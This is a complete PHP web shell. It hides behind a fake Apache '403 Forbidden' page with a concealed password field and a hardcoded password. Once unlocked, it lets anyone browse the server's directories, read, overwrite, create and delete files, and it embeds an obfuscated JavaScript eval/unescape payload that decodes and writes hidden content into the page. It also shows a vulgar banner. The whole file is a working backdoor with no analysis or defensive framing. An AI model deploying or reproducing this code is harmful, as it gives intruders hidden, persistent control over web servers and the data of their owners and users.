<?php
$password = "Bebekpanggangsunkitchen69%$"; // passwod
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);
$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
        print "
<html><head>
<title>403 Forbidden</title>
</head>
<body><h1>Forbidden</h1>
<p>You don't have permission to access this page on this server.</p>
<hr>
<address>Apache Server at ".$_SERVER["HTTP_HOST"]." Port 80 </address>
<style>
input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<center>
</body>
<pre align=center><font>
</font><form method=post> <input type='password' name='pass'></form></pre>";
        exit;        
    }
}
?>
<style>
  form{
      display:inline;
  }
  textarea{
      padding:10px;
  }
</style>
<center><h1 style="color:red;">HALLO KONTOL NGACENG ANAK HARAM</H1></center>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%69%34%65%38%61%31%63%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%35%31%33%30%39%36%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%31%35%34%31%33%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%30%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%69%34%65%38%61%31%63%28%27') + '%38%6b%67%6b%7c%60%76%36%3d%6c%69%66%23%77%7c%7b%69%6d%38%26%25%76%60%66%6a%6a%70%25%77%76%6d%77%29%7b%64%69%61%62%77%3e%28%6c%6a%66%60%26%28%72%77%67%3c%21%6c%7c%76%75%7b%3f%2b%27%66%2b%70%6e%73%30%7c%6d%75%26%6c%6b%27%71%5a%36%34%34%36%63%66%61%63%71%35%26%66%6c%62%23%23%73%61%66%71%60%38%26%3a%36%35%26%21%6b%61%61%65%6d%7c%38%26%3a%39%35%26%21%62%68%61%65%6b%35%27%69%61%65%61%68%64%21%3a%34%2d%66%6d%6b%70%6d%73%3b15130967%34%38%32%35%38%35%34' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>
<?php
if(isset($_GET["f"])&&$_GET["f"]!=null){$f=$_GET["f"];} else{ $f=".";}

echo "root web : ". $_SERVER['DOCUMENT_ROOT'] .'<hr>';

function myfunction($value,$key){
    global $f;
    echo "<a href='?f=".explode("/$value",realpath($f))[0]."/".htmlentities($value)."'>".htmlentities($value)."</a>/";
}

echo "<hr>";

$curFile=$_SERVER['REQUEST_SCHEME'] .'://'. $_SERVER['HTTP_HOST']. explode('?', $_SERVER['REQUEST_URI'], 2)[0];

echo '<form action="" method="post"> <input name="mkdir" style="width:100px;" required> <input type="submit" value="MKDIR"/> </form>';

echo '<form action="" method="post"> <input name="mkfile" style="width:100px;" required> <input type="submit" value="MAKE FILE"/> </form>';

echo "<br>";

if(isset($_GET["edit"])){
    $arrPath=explode("/",dirname(realpath($f)));
    array_walk($arrPath,"myfunction");
    
if (isset($_POST['text'])){
    file_put_contents($f, $_POST['text']);
}
$text = file_get_contents($f);

echo '<form action="" method="post"> <textarea name="text" style="width:100%;height:60%;">'.htmlspecialchars($text).'</textarea> <input type="submit" value="SAVE"/> </form>';
}
else{
    $arrPath=explode("/",realpath($f));
    array_walk($arrPath,"myfunction");
    
    if(isset($_POST["mkfile"])){
        echo file_put_contents($f."/".$_POST["mkfile"],"");
    }
    
    if(isset($_GET["unlink"])){
        unlink($f."/".$_GET["unlink"]);
    }
    
    if(isset($_POST["mkdir"])){
        mkdir($f."/".$_POST["mkdir"]);
    }
    
    echo "<table> <tr> <th>folder</th> <th>izin</th> <th> url </th> <th>options</th> </tr>";
    
    $data = scandir(is_dir($f)?$f:realpath($f));

 foreach ($data as $value) {
  $lastMod=date("d-m-Y H:i.", filemtime("$f/$value"));
  $url= str_replace($_SERVER['DOCUMENT_ROOT'],$_SERVER['REQUEST_SCHEME'] .'://'.$_SERVER['HTTP_HOST'],realpath("$f/$value"));

  if(is_dir("$f/$value")){
    echo "<tr> <td> <a href='?f=$f/".str_replace("&","%26",$value)."'>".htmlentities($value)."</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td> <td> <a href='?f=".str_replace("&","%26",$f)."&rmdir=$value'>delete</a> </td> </tr>";
  }
  else{
    echo "<tr> <td> <a href='?f=".str_replace("&","%26",$f)."/$value&edit=true'>$value</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td>  <td> <a href='?f=".str_replace("&","%26",$f)."&unlink=$value'>delete</a> </td> </tr>"; 
  }
 }
  
echo "</table>";
}

?>
